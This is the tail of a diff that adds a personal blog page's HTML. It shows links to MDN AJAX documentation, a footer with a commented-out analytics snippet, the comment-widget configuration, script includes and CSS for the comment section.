+<p>更详细的内容请参考： <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/AJAX/Getting_Started">Ajax</a> &amp; <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest">使用 XMLHttpRequest</a></p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
